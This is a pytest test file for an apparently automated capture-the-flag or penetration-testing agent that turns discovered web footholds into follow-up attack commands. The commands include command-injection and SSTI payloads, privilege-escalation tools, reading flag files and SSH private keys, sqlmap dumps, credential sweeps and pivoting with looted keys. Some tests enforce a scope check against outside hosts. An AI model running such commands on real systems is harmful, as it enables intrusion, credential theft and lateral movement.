from grin.closer import closer_commands, command_target, extract_web_foothold


def test_extract_foothold_from_web_rce_command():
    h = "web-rce --url http://172.30.0.15/ --param name --method POST --mode ssti --cmd 'id'"
    fh = extract_web_foothold(h, "172.30.0.15")
    assert fh["url"] == "http://172.30.0.15/"
    assert fh["param"] == "name"
    assert fh["method"] == "POST"
    assert fh["mode"] == "ssti"


def test_extract_foothold_from_curl_query():
    h = "curl 'http://172.30.0.12/ping?host=127.0.0.1;id' -> uid=33(www-data)"
    fh = extract_web_foothold(h, "172.30.0.12")
    assert fh["param"] == "host"
    assert "172.30.0.12" in fh["url"]
    assert fh["mode"] == "cmdi"


def test_extract_foothold_none_without_web_signal():
    assert extract_web_foothold("nmap -sV 10.0.0.5\nssh failed", "10.0.0.5") is None


def test_closer_commands_for_web_foothold_try_both_privesc():
    h = "web-rce --url http://172.30.0.15/ --param name --mode ssti --cmd 'id' -> uid=1000(appsvc)"
    cmds = closer_commands(h, "172.30.0.15")
    joined = "\n".join(cmds)
    assert "suid-hijack" in joined          # SUID PATH-hijack closer
    assert "sudo-gtfo" in joined            # sudo-NOPASSWD closer
    assert "web-rce" in joined and "cat /root/flag.txt" in joined  # direct read attempt
    # the three privesc commands target the discovered foothold (param + host)
    privesc = [c for c in cmds if c.startswith(("suid-hijack", "sudo-gtfo")) or "flag.txt" in c]
    assert privesc and all("172.30.0.15" in c and "--param name" in c for c in privesc)
    # with no key yet, it also emits enabling steps: key exfil + a subnet scan for the pivot host
    assert "cat /opt/deploy/id_rsa" in joined
    assert "nmap -sn 172.30.0.0/24" in joined


def test_closer_commands_ssh_pivot_when_key_and_host():
    h = ("cat /opt/deploy/id_rsa\n-----BEGIN OPENSSH PRIVATE KEY-----\n"
         "deploy key for the analyst service account\n"
         "Nmap scan report for 172.30.0.17\n22/tcp open ssh")
    cmds = closer_commands(h, "172.30.0.16")
    joined = "\n".join(cmds)
    assert "ssh-loot" in joined
    assert "172.30.0.17" in joined          # the discovered pivot host, not the entry host
    assert "/tmp/loot/id_rsa" in joined


def test_closer_commands_includes_sqlmap_for_web_foothold():
    h = "web-rce --url http://t/search --param q --method GET --mode cmdi -> uid=33"
    cmds = closer_commands(h, "t")
    sql = [c for c in cmds if c.startswith("sqlmap")]
    assert sql and "--batch" in sql[0] and "--dump" in sql[0] and "-p q" in sql[0]


def test_closer_commands_cred_sweep_when_ssh_open():
    h = "Nmap scan report for 10.0.0.5\n22/tcp open ssh OpenSSH 8.2"
    cmds = closer_commands(h, "10.0.0.5")
    assert any(c == "cred-sweep --target 10.0.0.5" for c in cmds)


def test_closer_commands_includes_lfi_crack_for_web_foothold():
    h = "curl 'http://t/download?file=readme.txt' -> some content"
    cmds = closer_commands(h, "t")
    assert any(c.startswith("lfi-crack ") and "--target t" in c for c in cmds)


def test_closer_commands_smb_enum_when_445_open():
    h = "Nmap scan report for 10.0.0.9\n445/tcp open microsoft-ds"
    cmds = closer_commands(h, "10.0.0.9")
    assert any("smbclient -L //10.0.0.9 -N" in c for c in cmds)


def test_foothold_ignores_out_of_scope_url_from_banner():
    # REGRESSION: nmap prints "https://nmap.org" in its banner; the closer must NOT target it —
    # it must fall back to the in-scope target, never attack a leaked external URL.
    h = "Starting Nmap 7.99 ( https://nmap.org ) scan of 172.30.0.16\n80/tcp open http"
    fh = extract_web_foothold(h, "172.30.0.16")
    assert fh is not None
    assert "nmap.org" not in fh["url"]
    assert "172.30.0.16" in fh["url"]
    # and no closer command may reference the out-of-scope host
    assert all("nmap.org" not in c for c in closer_commands(h, "172.30.0.16"))


def test_command_target_extracts_true_destination():
    assert command_target("ssh-loot --host 172.30.0.17 --key /tmp/loot/id_rsa", "172.30.0.16") \
        == "172.30.0.17"
    assert command_target("cred-sweep --target 10.0.0.5", "x") == "10.0.0.5"
    assert command_target("sqlmap -u 'http://evil.com/?id=1' -p id --batch", "10.0.0.5") \
        == "evil.com"   # so the spine scope-check sees evil.com and REFUSES it
    assert command_target("suid-hijack --url http://172.30.0.15/ --param name", "t") == "172.30.0.15"
    assert command_target("nmap -sn 10.0.0.0/24", "10.0.0.5") == "10.0.0.5"  # no host -> default


def test_closer_commands_ssh_loot_on_bare_host_pivot():
    # cross-objective pivot: bare-host target, no web foothold -> try ssh-loot with the persisted key
    cmds = closer_commands("scanning the vault host\n22/tcp open ssh", "172.30.0.17")
    assert any(c.startswith("ssh-loot --host 172.30.0.17 --key /tmp/loot/id_rsa") for c in cmds)


def test_closer_commands_empty_when_no_foothold():
    # no web foothold, no ssh signal, and not a bare IP host -> nothing to deterministically close
    assert closer_commands("nmap only, nothing found", "example.test") == []
